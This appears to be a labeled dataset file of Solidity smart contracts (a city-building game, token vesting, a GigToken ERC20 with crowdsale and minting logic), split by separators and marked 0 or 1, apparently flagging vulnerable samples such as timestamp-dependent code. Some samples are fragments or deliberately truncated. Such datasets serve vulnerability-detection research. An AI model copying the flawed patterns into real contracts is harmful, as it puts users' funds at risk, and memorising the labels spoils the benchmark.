cdata.withdrawSS = withdrawSS;    }    function adminUpdateWorldSnapshot() external    {        require(msg.sender == owner || msg.sender == admin);        ValidateWorldSnapshotInternal(nowday());    }    function adminGetPastShopFund() external view returns(uint256 ethBal)    {        uint256 startday;        WORLDSNAPSHOT memory wss;        require(msg.sender == owner || msg.sender == admin);        ethBal = 0;        startday = worldData.starttime / 24 hours;        for(uint256 day = nowday() - 2; day >= startday; day--)        {            wss = TestWorldSnapshotInternal(day);            ethBal += wss.ethShopFundRemain;        }    }    function adminCollectPastShopFund() external    {        uint256 startday;        uint256 ethBal;        require(msg.sender == owner || msg.sender == admin);        ethBal = ethBalance[owner];        startday = worldData.starttime / 24 hours;        for(uint256 day = nowday() - 2; day >= startday; day--)        {            WORLDSNAPSHOT storage wss = ValidateWorldSnapshotInternal(day);            ethBal += wss.ethShopFundRemain;            wss.ethShopFundRemain = 0;        }        ethBalance[owner] = ethBal;    }    function adminSendWorldBalance() external payable    {        require(msg.sender == owner || msg.sender == admin);        WORLDSNAPSHOT storage wss = ValidateWorldSnapshotInternal(nowday());        wss.ethBalance += msg.value;    }    function adminTransferWorldBalance(uint256 eth) external    {        require(msg.sender == owner || msg.sender == admin);        WORLDSNAPSHOT storage wss = ValidateWorldSnapshotInternal(nowday());        require(eth <= wss.ethBalance);        ethBalance[owner] += eth;        wss.ethBalance -= eth;    }    function adminGetContractBalance() external view returns(uint256)    {        require(msg.sender == owner || msg.sender == admin);        return address(this).balance;    }    function adminTransferContractBalance(uint256 eth) external    {        require(msg.sender == owner || msg.sender == admin);        owner.transfer(eth);    }    function adminGetPlayerCount() external view returns(uint256)    {        require(msg.sender == owner || msg.sender == admin);        return playerlist.length;    }    function adminGetPlayer(uint256 index) external view returns(address player, uint256 eth)    {        require(msg.sender == owner || msg.sender == admin);        player = playerlist[index];        eth = ethBalance[player];    }              function ValidateWorldSnapshotInternal(uint256 day) private returns(WORLDSNAPSHOT storage)    {        uint256 fndf;        uint256 sday;        sday = day;        while (!worldSnapshot[sday].valid)            sday--;        WORLDSNAPSHOT storage prev = worldSnapshot[sday];        sday++;        while (sday <= day)        {            worldSnapshot[sday] = WORLDSNAPSHOT({valid:true, ethDay:0, ethBalance:0, ethRankFund:0, ethShopFund:0, ethRankFundRemain:0, ethShopFundRemain:0, population:prev.population, credits:prev.credits, lasttime:prev.lasttime / 24 hours + 1});            WORLDSNAPSHOT storage wss = worldSnapshot[sday];            wss.ethBalance = prev.ethBalance * 90 /100;            fndf = prev.ethBalance - wss.ethBalance;            wss.ethRankFund = fndf * 70 / 100;            wss.ethShopFund = fndf - wss.ethRankFund;            wss.ethRankFund = wss.ethRankFund;            wss.ethShopFund = wss.ethShopFund;            wss.ethRankFundRemain = wss.ethRankFund;            wss.ethShopFundRemain = wss.ethShopFund;            prev = wss;            sday++;        }        return prev;    }    function TestWorldSnapshotInternal(uint256 day) private view returns(WORLDSNAPSHOT memory)    {        uint256 fndf;        uint256 sday;        sday = day;        while (!worldSnapshot[sday].valid)            sday--;        WORLDSNAPSHOT memory prev = worldSnapshot[sday];        sday++;        while (sday <= day)        {            WORLDSNAPSHOT memory wss = WORLDSNAPSHOT({valid:true, ethDay:0, ethBalance:0, ethRankFund:0, ethShopFund:0, ethRankFundRemain:0, ethShopFundRemain:0, population:prev.population, credits:prev.credits, lasttime:prev.lasttime / 24 hours + 1});            wss.ethBalance = prev.ethBalance * 90 /100;            fndf = prev.ethBalance - wss.ethBalance;            wss.ethRankFund = fndf * 70 / 100;            wss.ethShopFund = fndf - wss.ethRankFund;            wss.ethRankFund = wss.ethRankFund;            wss.ethShopFund = wss.ethShopFund;            wss.ethRankFundRemain = wss.ethRankFund;            wss.ethShopFundRemain = wss.ethShopFund;            prev = wss;            sday++;        }        return prev;    }    function ValidateCitySnapshotInternal(address player, uint256 day) private returns(CITYSNAPSHOT storage)    {        uint256 sday;        sday = day;        while (!citySnapshot[player][sday].valid)            sday--;        CITYSNAPSHOT storage css = citySnapshot[player][sday];        sday++;        while (sday <= day)        {            citySnapshot[player][sday] = CITYSNAPSHOT({valid:true, population:css.population, credits:css.credits, shopCredits:css.credits, lasttime:sday * 24 hours});            css = citySnapshot[player][sday];            sday++;        }            return css;    }    function TestCitySnapshotInternal(address player, uint256 day) private view returns(CITYSNAPSHOT memory)    {        uint256 sday;        sday = day;        while (!citySnapshot[player][sday].valid)            sday--;        CITYSNAPSHOT memory css = citySnapshot[player][sday];        sday++;        while (sday <= day)        {            css = CITYSNAPSHOT({valid:true, population:css.population, credits:css.credits, shopCredits:css.credits, lasttime:sday * 24 hours});            sday++;        }        return css;    }}
0<CODESPLIT>contract EtherCity{    struct WORLDDATA    {        uint256 ethBalance;        uint256 ethDev;        uint256 population;        uint256 credits;        uint256 starttime;    }    struct WORLDSNAPSHOT    {        uint256 population;        uint256 credits;        uint256 lasttime;    }    struct CITYDATA    {        uint256 credits;        uint256 population;        uint256 creditsPerSec;            uint256 landOccupied;        uint256 landUnoccupied;        uint256 lasttime;    }    struct CITYSNAPSHOT    {        uint256 population;        uint256 credits;        uint256 shopCredits;        uint256 lasttime;    }    struct BUILDINGDATA    {        uint256 constructCount;        uint256 upgradeCount;        uint256 population;        uint256 creditsPerSec;        }    uint256 private constant INTFLOATDIV = 100;    address private owner;    address private admin;    EtherCityConfig private config;    EtherCityData private data;    EtherCityRank private rank;         event OnConstructed(address player, uint256 id, uint256 count);    event OnUpdated(address player, uint256 id, uint256 count);    event OnDemolished(address player, uint256 id, uint256 count);    event OnBuyLands(address player, uint256 count);    event OnBuyCredits(address player, uint256 eth);    constructor() public payable    {        owner = msg.sender;    }    function GetVersion() external pure returns(uint256)    {        return 1001;    }    function IsPlayer() external view returns(bool)    {        return data.IsPlayer(msg.sender);    }    function StartCity() external    {        uint256 ethland;        uint256 maxland;        uint256 initcrdt;        uint256 crdtsec;        uint256 landcount;        (ethland, maxland, initcrdt, crdtsec, landcount) = config.GetInitData();        CITYDATA memory cdata = dtCreateCityData(msg.sender, crdtsec, landcount);        UpdateCityData(cdata, 0, initcrdt, 0, 0);        dtSetCityData(msg.sender, cdata);    }    function GetCityName(address player) external view returns(bytes32)    {        return data.GetCityName(player);    }    function SetCityName(bytes32 name) external    {        data.SetCityName(msg.sender, name);    }    function GetWorldSnapshot() external view returns(uint256 ethFund, uint256 population, uint256 credits,                                                     uint256 lasttime, uint256 nexttime, uint256 timestamp)    {        WORLDSNAPSHOT memory wss;                (ethFund, wss) = dtTestWorldSnapshot(nowday());        population = wss.population;        credits = wss.credits;        lasttime = wss.lasttime;        nexttime = daytime(nowday() + 1);        timestamp = block.timestamp;    }    function GetCityData() external view returns(bytes32 cityname, uint256 population, uint256 credits, uint256 creditsPerSec,                                                                    uint256 occupied, uint256 unoccupied, uint256 timestamp)    {        CITYDATA memory cdata = dtGetCityData(msg.sender);        cityname = data.GetCityName(msg.sender);        credits = CalcIncCredits(cdata) + cdata.credits;        population = cdata.population;        creditsPerSec = cdata.creditsPerSec;            occupied = cdata.landOccupied;        unoccupied = cdata.landUnoccupied;        timestamp = block.timestamp;    }    function GetCitySnapshot() external view returns(uint256 population, uint256 credits, uint256 timestamp)    {        CITYSNAPSHOT memory css = dtTestCitySnapshot(msg.sender, nowday());        population = css.population;        credits = css.credits;        timestamp = block.timestamp;    }    function GetBuildingData(uint256 id) external view returns(uint256 constructCount, uint256 upgradeCount, uint256 population, uint256 creditsPerSec)    {        BUILDINGDATA memory bdata = dtGetBuildingData(msg.sender, id);        constructCount = bdata.constructCount;        upgradeCount = bdata.upgradeCount;        (population, creditsPerSec) = CalcBuildingParam(bdata);    }    function GetConstructCost(uint256 id, uint256 count) external view returns(uint256 cnstcrdt, uint256 cnsteth)    {        (cnstcrdt, cnsteth) = config.GetConstructCost(id, count);    }    function ConstructByCredits(uint256 id, uint256 count) external    {        CITYDATA memory cdata = dtGetCityData(msg.sender);        require(count > 0);        if (!ConstructBuilding(cdata, id, count, true))            require(false);        dtSetCityData(msg.sender, cdata);        emit OnConstructed(msg.sender, id, count);    }    function ConstructByEth(uint256 id, uint256 count) external payable    {        CITYDATA memory cdata = dtGetCityData(msg.sender);        require(count > 0);        if (!ConstructBuilding(cdata, id, count, false))            require(false);        dtSetCityData(msg.sender, cdata);        emit OnConstructed(msg.sender, id, count);    }    function BuyLandsByEth(uint256 count) external payable    {        uint256 ethland;        uint256 maxland;        require(count > 0);        (ethland, maxland) = config.GetLandData();        CITYDATA memory cdata = dtGetCityData(msg.sender);        require(cdata.landOccupied + cdata.landUnoccupied + count <= maxland);        UpdateEthBalance(ethland * count, msg.value);        UpdateCityData(cdata, 0, 0, 0, 0);        cdata.landUnoccupied += count;        dtSetCityData(msg.sender, cdata);        emit OnBuyLands(msg.sender, count);    }    function BuyCreditsByEth(uint256 eth) external payable    {        CITYDATA memory cdata = dtGetCityData(msg.sender);        require(eth > 0);        UpdateEthBalance(eth, msg.value);        UpdateCityData(cdata, 0, 0, 0, 0);        cdata.credits += eth * config.GetCreditsPerEth();        dtSetCityData(msg.sender, cdata);        emit OnBuyCredits(msg.sender, eth);    }    function GetUpgradeCost(uint256 id, uint256 count) external view returns(uint256)    {        return config.GetUpgradeCost(id, count);    }    function UpgradeByCredits(uint256 id, uint256 count) external    {        uint256 a_population;        uint256 a_crdtsec;        uint256 updcrdt;        CITYDATA memory cdata = dtGetCityData(msg.sender);                require(count > 0);        (a_population, a_crdtsec) = UpdateBuildingParam(cdata, id, 0, count);        require((a_population > 0) || (a_crdtsec > 0));        updcrdt = config.GetUpgradeCost(id, count);        UpdateCityData(cdata, a_population, 0, updcrdt, a_crdtsec);        if (a_population != 0)            rank.UpdateRank(msg.sender, cdata.population, cdata.lasttime);        dtSetCityData(msg.sender, cdata);        emit OnUpdated(msg.sender, id, count);    }    function GetDemolishCost(uint256 id, uint256 count) external view returns (uint256)    {        require(count > 0);        return config.GetDemolishCost(id, count);    }    function DemolishByCredits(uint256 id, uint256 count) external    {        uint256 a_population;        uint256 a_crdtsec;        uint256 dmlcrdt;        CITYDATA memory cdata = dtGetCityData(msg.sender);                require(count > 0);        (a_population, a_crdtsec) = UpdateBuildingParam(cdata, id, -count, 0);        require((a_population > 0) || (a_crdtsec > 0));        dmlcrdt = config.GetDemolishCost(id, count);        UpdateCityData(cdata, a_population, 0, dmlcrdt, a_crdtsec);        if (a_population != 0)            rank.UpdateRank(msg.sender, cdata.population, cdata.lasttime);        dtSetCityData(msg.sender, cdata);        emit OnDemolished(msg.sender, id, count);    }    function GetEthBalance() external view returns(uint256 ethBal)    {        return data.GetWithdrawBalance(msg.sender);    }    function WithdrawEther() external    {        data.WithdrawEther(msg.sender);        CITYDATA memory cdata = dtGetCityData(msg.sender);        UpdateCityData(cdata, 0, 0, 0, 0);        dtSetCityData(msg.sender, cdata);    }    function GetEthShop() external view returns(uint256 shopEth, uint256 shopCredits)    {        (shopEth, shopCredits) = data.GetEthShop(msg.sender);    }    function TradeEthShop(uint256 credits) external    {        data.TradeEthShop(msg.sender, credits);        CITYDATA memory cdata = dtGetCityData(msg.sender);        UpdateCityData(cdata, 0, 0, credits, 0);        dtSetCityData(msg.sender, cdata);    }              function adminIsAdmin() external view returns(bool)    {        return msg.sender == owner || msg.sender == admin;    }    function adminSetAdmin(address addr) external    {        require(msg.sender == owner);        admin = addr;    }    function adminSetConfig(address dta, address cfg, address rnk) external    {        require(msg.sender == owner || msg.sender == admin);        data = EtherCityData(dta);        config = EtherCityConfig(cfg);        rank = EtherCityRank(rnk);    }    function adminAddWorldBalance() external payable    {        require(msg.value > 0);        require(msg.sender == owner || msg.sender == admin);        UpdateEthBalance(msg.value, msg.value);    }    function adminGetBalance() external view returns(uint256 dta_bal, uint256 cfg_bal, uint256 rnk_bal, uint256 cty_bal)    {        require(msg.sender == owner || msg.sender == admin);        dta_bal = address(data).balance;        cfg_bal = address(config).balance;        rnk_bal = address(rank).balance;        cty_bal = address(this).balance;    }              function nowday() private view returns(uint256)    {        return block.timestamp / 24 hours;    }    function daytime(uint256 day) private pure returns(uint256)    {        return day * 24 hours;    }    function ConstructBuilding(CITYDATA memory cdata, uint256 id, uint256 count, bool byCredit) private returns(bool)    {        uint256 a_population;        uint256 a_crdtsec;        uint256 cnstcrdt;        uint256 cnsteth;        if (count > cdata.landUnoccupied)            return false;        (a_population, a_crdtsec) = UpdateBuildingParam(cdata, id, count, 0);        if ((a_population == 0) && (a_crdtsec == 0))            return false;        (cnstcrdt, cnsteth) = config.GetConstructCost(id, count);        if (!byCredit)            UpdateEthBalance(cnsteth, msg.value);        UpdateCityData(cdata, a_population, 0, cnstcrdt, a_crdtsec);        if (a_population != 0)            rank.UpdateRank(msg.sender, cdata.population, cdata.lasttime);        return true;                }    function UpdateBuildingParam(CITYDATA memory cdata, uint256 id, uint256 cnstcount, uint256 updcount) private returns(uint256 a_population, uint256 a_crdtsec)    {        uint256 population;        uint256 crdtsec;        uint256 maxupd;        BUILDINGDATA memory bdata = dtGetBuildingData(msg.sender, id);        if (bdata.upgradeCount == 0)            bdata.upgradeCount = 1;        a_population = 0;        a_crdtsec = 0;        (population, crdtsec, maxupd) = config.GetBuildingParam(id);        if (cnstcount > cdata.landUnoccupied)            return;        cdata.landOccupied += cnstcount;        cdata.landUnoccupied -= cnstcount;        if (bdata.upgradeCount + updcount > maxupd)            return;        (a_population, a_crdtsec) = CalcBuildingParam(bdata);        bdata.population = population;        bdata.creditsPerSec = crdtsec;        bdata.constructCount += cnstcount;        bdata.upgradeCount += updcount;        (population, crdtsec) = CalcBuildingParam(bdata);        dtSetBuildingData(msg.sender, id, bdata);        a_population = population - a_population;        a_crdtsec = crdtsec - a_crdtsec;    }    function CalcBuildingParam(BUILDINGDATA memory bdata) private pure returns(uint256 population, uint256 crdtsec)    {        uint256 count;        count = bdata.constructCount * bdata.upgradeCount;        population = bdata.population * count;        crdtsec = bdata.creditsPerSec * count;    }    function CalcIncCredits(CITYDATA memory cdata) private view returns(uint256)    {        return SafeMath.muldiv(cdata.creditsPerSec, block.timestamp - cdata.lasttime, INTFLOATDIV);    }    function UpdateCityData(CITYDATA memory cdata, uint256 pop, uint256 inccrdt, uint256 deccrdt, uint256 crdtsec) private    {        uint256 day;        day = nowday();        inccrdt += CalcIncCredits(cdata);        require((cdata.credits + inccrdt) >= deccrdt);        inccrdt -= deccrdt;        cdata.population += pop;        cdata.credits += inccrdt;        cdata.creditsPerSec += crdtsec;        cdata.lasttime = block.timestamp;        WORLDDATA memory wdata = dtGetWorldData();        wdata.population += pop;        wdata.credits += inccrdt;        dtSetWorldData(wdata);        WORLDSNAPSHOT memory wss = dtValidateWorldSnapshot(day);        wss.population += pop;        wss.credits += inccrdt;        wss.lasttime = block.timestamp;        dtSetWorldSnapshot(day, wss);        CITYSNAPSHOT memory css = dtValidateCitySnapshot(msg.sender, day);        css.population += pop;        css.credits += inccrdt;        css.shopCredits += inccrdt;        css.lasttime = block.timestamp;        dtSetCitySnapshot(msg.sender, day, css);    }    function UpdateEthBalance(uint256 eth, uint256 val) private returns(bool)    {        uint256 devf;        uint256 fndf;        uint256 rnkf;        if (eth > val)        {            fndf = dtGetEthBalance(msg.sender);            require(eth - val <= fndf);            dtSetEthBalance(msg.sender, fndf - eth + val);        }        devf = eth * 17 / 100;        fndf = eth * 33 / 100;        rnkf = fndf * 70 / 100;        data.UpdateEthBalance.value(val)(eth - devf - fndf, devf, rnkf, fndf - rnkf);    }              function dtGetWorldData() private view returns(WORLDDATA memory wdata)    {         (wdata.ethBalance, wdata.ethDev, wdata.population, wdata.credits, wdata.starttime) = data.GetWorldData();    }    function dtSetWorldData(WORLDDATA memory wdata) private    {        data.SetWorldData(wdata.ethBalance, wdata.ethDev, wdata.population, wdata.credits, wdata.starttime);    }    function dtSetWorldSnapshot(uint256 day, WORLDSNAPSHOT memory wss) private    {        data.SetWorldSnapshot(day, true, wss.population, wss.credits, wss.lasttime);    }    function dtCreateCityData(address player, uint256 crdtsec, uint256 landcount) private returns(CITYDATA memory)    {        data.CreateCityData(player, crdtsec, landcount);        return dtGetCityData(player);    }    function dtGetCityData(address player) private view returns(CITYDATA memory cdata)    {        (cdata.credits, cdata.population, cdata.creditsPerSec, cdata.landOccupied, cdata.landUnoccupied, cdata.lasttime) = data.GetCityData(player);    }    function dtSetCityData(address player, CITYDATA memory cdata) private    {        data.SetCityData(player, cdata.credits, cdata.population, cdata.creditsPerSec, cdata.landOccupied, cdata.landUnoccupied, cdata.lasttime);    }    function dtSetCitySnapshot(address player, uint256 day, CITYSNAPSHOT memory css) private    {        data.SetCitySnapshot(player, day, true, css.population, css.credits, css.shopCredits, css.lasttime);    }    function dtGetBuildingData(address player, uint256 id) private view returns(BUILDINGDATA memory bdata)    {        (bdata.constructCount, bdata.upgradeCount, bdata.population, bdata.creditsPerSec) = data.GetBuildingData(player, id);    }    function dtSetBuildingData(address player, uint256 id, BUILDINGDATA memory bdata) private    {        data.SetBuildingData(player, id, bdata.constructCount, bdata.upgradeCount, bdata.population, bdata.creditsPerSec);    }    function dtGetEthBalance(address player) private view returns(uint256)    {        return data.GetEthBalance(player);    }    function dtSetEthBalance(address player, uint256 eth) private    {        data.SetEthBalance(player, eth);    }    function dtAddEthBalance(address player, uint256 eth) private    {        data.AddEthBalance(player, eth);    }    function dtValidateWorldSnapshot(uint256 day) private returns(WORLDSNAPSHOT memory wss)    {        uint256 ethRankFund;        (ethRankFund, wss.population, wss.credits, wss.lasttime) = data.ValidateWorldSnapshot(day);    }    function dtTestWorldSnapshot(uint256 day) private view returns(uint256 ethRankFund, WORLDSNAPSHOT memory wss)    {        (ethRankFund, wss.population, wss.credits, wss.lasttime) = data.TestWorldSnapshot(day);    }    function dtValidateCitySnapshot(address player, uint256 day) private returns(CITYSNAPSHOT memory css)    {        (css.population, css.credits, css.shopCredits, css.lasttime) = data.ValidateCitySnapshot(player, day);    }    function dtTestCitySnapshot(address player, uint256 day) private view returns(CITYSNAPSHOT memory css)    {        (css.population, css.credits, css.shopCredits, css.lasttime) = data.TestCitySnapshot(player, day);    }}
1<CODESPLIT>contract TokenVesting {  function calculateVestedTokens(uint256 _tokens,uint256 _vesting,uint256 _start,uint256 _claimed) internal constant returns (uint256) {    uint256 time = block.timestamp;    if (time < _start) {      return 0;    }  }}
0<CODESPLIT>contract GigERC20 is StandardToken, Ownable {         uint256 public creationBlock;    uint8 public decimals;    string public name;    string public symbol;    string public standard;    bool public locked;         function GigERC20(        uint256 _totalSupply,        string _tokenName,        uint8 _decimalUnits,        string _tokenSymbol,        bool _transferAllSupplyToOwner,        bool _locked    ) public {        standard = 'ERC20 0.1';        locked = _locked;        totalSupply_ = _totalSupply;        if (_transferAllSupplyToOwner) {            balances[msg.sender] = totalSupply_;        } else {            balances[this] = totalSupply_;        }        name = _tokenName;                 symbol = _tokenSymbol;                 decimals = _decimalUnits;                 creationBlock = block.number;    }    function setLocked(bool _locked) public onlyOwner {        locked = _locked;    }         function transfer(address _to, uint256 _value) public returns (bool) {        require(locked == false);        return super.transfer(_to, _value);    }    function approve(address _spender, uint256 _value) public returns (bool success) {        if (locked) {            return false;        }        return super.approve(_spender, _value);    }    function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {        if (locked) {            return false;        }        return super.increaseApproval(_spender, _addedValue);    }    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {        if (locked) {            return false;        }        return super.decreaseApproval(_spender, _subtractedValue);    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {        if (locked) {            return false;        }        return super.transferFrom(_from, _to, _value);    }} library SafeMath {     function mul(uint256 a, uint256 b) internal pure returns (uint256) {    if (a == 0) {      return 0;    }    uint256 c = a * b;    assert(c / a == b);    return c;  }     function div(uint256 a, uint256 b) internal pure returns (uint256) {         uint256 c = a / b;         return c;  }     function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }     function add(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a + b;    assert(c >= a);    return c;  }} 
0<CODESPLIT>contract MintingERC20 is GigERC20 {    using SafeMath for uint256;         mapping (address => bool) public minters;    uint256 public maxSupply;         modifier onlyMinters () {        require(true == minters[msg.sender]);        _;    }    function MintingERC20(        uint256 _initialSupply,        uint256 _maxSupply,        string _tokenName,        uint8 _decimals,        string _symbol,        bool _transferAllSupplyToOwner,        bool _locked    )        public GigERC20(_initialSupply, _tokenName, _decimals, _symbol, _transferAllSupplyToOwner, _locked)    {        standard = 'MintingERC20 0.1';        minters[msg.sender] = true;        maxSupply = _maxSupply;    }    function addMinter(address _newMinter) public onlyOwner {        minters[_newMinter] = true;    }    function removeMinter(address _minter) public onlyOwner {        minters[_minter] = false;    }    function mint(address _addr, uint256 _amount) public onlyMinters returns (uint256) {        if (true == locked) {            return uint256(0);        }        if (_amount == uint256(0)) {            return uint256(0);        }        if (totalSupply_.add(_amount) > maxSupply) {            return uint256(0);        }        totalSupply_ = totalSupply_.add(_amount);        balances[_addr] = balances[_addr].add(_amount);        Transfer(address(0), _addr, _amount);        return _amount;    }} 
1<CODESPLIT>contract GigToken is MintingERC20 {    SellableToken public crowdSale;      SellableToken public privateSale;    bool public transferFrozen = false;    uint256 public crowdSaleEndTime;    mapping(address => uint256) public lockedBalancesReleasedAfterOneYear;    modifier onlyCrowdSale() {        require(crowdSale != address(0) && msg.sender == address(crowdSale));        _;    }    modifier onlySales() {        require((privateSale != address(0) && msg.sender == address(privateSale)) ||            (crowdSale != address(0) && msg.sender == address(crowdSale)));        _;    }    event MaxSupplyBurned(uint256 burnedTokens);    function GigToken(bool _locked) public        MintingERC20(0, maxSupply, 'GigBit', 18, 'GBTC', false, _locked)    {        standard = 'GBTC 0.1';        maxSupply = uint256(1000000000).mul(uint256(10) ** decimals);    }    function setCrowdSale(address _crowdSale) public onlyOwner {        require(_crowdSale != address(0));        crowdSale = SellableToken(_crowdSale);        crowdSaleEndTime = crowdSale.endTime();    }    function setPrivateSale(address _privateSale) public onlyOwner {        require(_privateSale != address(0));        privateSale = SellableToken(_privateSale);    }    function freezing(bool _transferFrozen) public onlyOwner {        transferFrozen = _transferFrozen;    }    function isTransferAllowed(address _from, uint256 _value) public view returns (bool status) {        uint256 senderBalance = balanceOf(_from);        if (transferFrozen == true || senderBalance < _value) {            return false;        }        uint256 lockedBalance = lockedBalancesReleasedAfterOneYear[_from];             if (lockedBalance > 0 && senderBalance.sub(_value) < lockedBalance) {            uint256 unlockTime = crowdSaleEndTime + 1 years;                         if (crowdSaleEndTime == 0 || block.timestamp < unlockTime) {                return false;            }            uint256 secsFromUnlock = block.timestamp.sub(unlockTime);                         uint256 months = secsFromUnlock / 30 days;            if (months > 12) {                months = 12;            }            uint256 tokensPerMonth = lockedBalance / 12;            uint256 unlockedBalance = tokensPerMonth.mul(months);            uint256 actualLockedBalance = lockedBalance.sub(unlockedBalance);            if (senderBalance.sub(_value) < actualLockedBalance) {                return false;            }        }        if (block.timestamp < crowdSaleEndTime &&            crowdSale != address(0) &&            crowdSale.isTransferAllowed(_from, _value) == false        ) {            return false;        }        return true;    }    function transfer(address _to, uint _value) public returns (bool) {        require(isTransferAllowed(msg.sender, _value));        return super.transfer(_to, _value);    }    function transferFrom(address _from, address _to, uint _value) public returns (bool success) {                 require((crowdSaleEndTime <= block.timestamp) && isTransferAllowed(_from, _value));        return super.transferFrom(_from, _to, _value);    }    function approve(address _spender, uint256 _value) public returns (bool success) {                 require(crowdSaleEndTime <= block.timestamp);        return super.approve(_spender, _value);    }    function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {                 require(crowdSaleEndTime <= block.timestamp);        return super.increaseApproval(_spender, _addedValue);    }    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {                 require(crowdSaleEndTime <= block.timestamp);        return super.decreaseApproval(_spender, _subtractedValue);    }    function increaseLockedBalance(address _address, uint256 _tokens) public onlySales {        lockedBalancesReleasedAfterOneYear[_address] =            lockedBalancesReleasedAfterOneYear[_address].add(_tokens);    }         function burnInvestorTokens(        address _address,        uint256 _amount    ) public onlyCrowdSale returns (uint256) {        require(block.timestamp > crowdSaleEndTime);        require(_amount <= balances[_address]);        balances[_address] = balances[_address].sub(_amount);        totalSupply_ = totalSupply_.sub(_amount);        Transfer(_address, address(0), _amount);        return _amount;    }         function burnUnsoldTokens(uint256 _amount) public onlyCrowdSale {        require(block.timestamp > crowdSaleEndTime);        maxSupply = maxSupply.sub(_amount);        MaxSupplyBurned(_amount);    }}
0<CODESPLIT>contract Multivest is Ownable {    using SafeMath for uint256;         mapping (address => bool) public allowedMultivests;         event MultivestSet(address multivest);    event MultivestUnset(address multivest);    event Contribution(address holder, uint256 value, uint256 tokens);    modifier onlyAllowedMultivests(address _addresss) {        require(allowedMultivests[_addresss] == true);        _;    }         function Multivest() public {}    function setAllowedMultivest(address _address) public onlyOwner {        allowedMultivests[_address] = true;        MultivestSet(_address);    }    function unsetAllowedMultivest(address _address) public onlyOwner {        allowedMultivests[_address] = false;        MultivestUnset(_address);    }    function multivestBuy(address _address, uint256 _value) public onlyAllowedMultivests(msg.sender) {        require(buy(_address, _value) == true);    }    function multivestBuy(        address _address,        uint8 _v,        bytes32 _r,        bytes32 _s    ) public payable onlyAllowedMultivests(verify(keccak256(msg.sender), _v, _r, _s)) {        require(_address == msg.sender && buy(msg.sender, msg.value) == true);    }    function verify(bytes32 _hash, uint8 _v, bytes32 _r, bytes32 _s) internal pure returns (address) {        bytes memory prefix = '\x19Ethereum Signed Message:\n32';        return ecrecover(keccak256(prefix, _hash), _v, _r, _s);    }    function buy(address _address, uint256 _value) internal returns (bool);}
0<CODESPLIT>contract SellableToken is Multivest {    uint256 public constant MONTH_IN_SEC = 2629743;    GigToken public token;    uint256 public minPurchase = 100 * 10 ** 5;    uint256 public maxPurchase;    uint256 public softCap;    uint256 public hardCap;    uint256 public startTime;    uint256 public endTime;    uint256 public maxTokenSupply;    uint256 public soldTokens;    uint256 public collectedEthers;    address public etherHolder;    uint256 public collectedUSD;    uint256 public etherPriceInUSD;    uint256 public priceUpdateAt;    mapping(address => uint256) public etherBalances;    Tier[] public tiers;    struct Tier {        uint256 discount;        uint256 startTime;        uint256 endTime;    }    event Refund(address _holder, uint256 _ethers, uint256 _tokens);    event NewPriceTicker(string _price);    function SellableToken(        address _token,        address _etherHolder,        uint256 _startTime,        uint256 _endTime,        uint256 _maxTokenSupply,        uint256 _etherPriceInUSD    )    public Multivest()    {        require(_token != address(0) && _etherHolder != address(0));        token = GigToken(_token);        require(_startTime < _endTime);        etherHolder = _etherHolder;        require((_maxTokenSupply == uint256(0)) || (_maxTokenSupply <= token.maxSupply()));        startTime = _startTime;        endTime = _endTime;        maxTokenSupply = _maxTokenSupply;        etherPriceInUSD = _etherPriceInUSD;        priceUpdateAt = block.timestamp;    }    function setTokenContract(address _token) public onlyOwner {        require(_token != address(0));        token = GigToken(_token);    }    function setEtherHolder(address _etherHolder) public onlyOwner {        if (_etherHolder != address(0)) {            etherHolder = _etherHolder;        }    }    function setPurchaseLimits(uint256 _min, uint256 _max) public onlyOwner {        if (_min < _max) {            minPurchase = _min;            maxPurchase = _max;        }    }    function mint(address _address, uint256 _tokenAmount) public onlyOwner returns (uint256) {        return mintInternal(_address, _tokenAmount);    }    function isActive() public view returns (bool);    function isTransferAllowed(address _from, uint256 _value) public view returns (bool);    function withinPeriod() public view returns (bool);    function getMinEthersInvestment() public view returns (uint256) {        return uint256(1 ether).mul(minPurchase).div(etherPriceInUSD);    }    function calculateTokensAmount(uint256 _value) public view returns (uint256 tokenAmount, uint256 usdAmount);    function calculateEthersAmount(uint256 _tokens) public view returns (uint256 ethers, uint256 bonus);    function updatePreICOMaxTokenSupply(uint256 _amount) public;                   function setEtherInUSD(string _price) public onlyAllowedMultivests(msg.sender) {        bytes memory bytePrice = bytes(_price);        uint256 dot = bytePrice.length.sub(uint256(6));                 require(0x2e == uint(bytePrice[dot]));        uint256 newPrice = uint256(10 ** 23).div(parseInt(_price, 5));        require(newPrice > 0);        etherPriceInUSD = parseInt(_price, 5);        priceUpdateAt = block.timestamp;        NewPriceTicker(_price);    }    function mintInternal(address _address, uint256 _tokenAmount) internal returns (uint256) {        uint256 mintedAmount = token.mint(_address, _tokenAmount);        require(mintedAmount == _tokenAmount);        soldTokens = soldTokens.add(_tokenAmount);        if (maxTokenSupply > 0) {            require(maxTokenSupply >= soldTokens);        }        return _tokenAmount;    }    function transferEthers() internal;    function parseInt(string _a, uint _b) internal pure returns (uint) {        bytes memory bresult = bytes(_a);        uint res = 0;        bool decimals = false;        for (uint i = 0; i < bresult.length; i++) {            if ((bresult[i] >= 48) && (bresult[i] <= 57)) {                if (decimals) {                    if (_b == 0) break;                    else _b--;                }                res *= 10;                res += uint(bresult[i]) - 48;            } else if (bresult[i] == 46) decimals = true;        }        if (_b > 0) res *= 10 ** _b;        return res;    }}
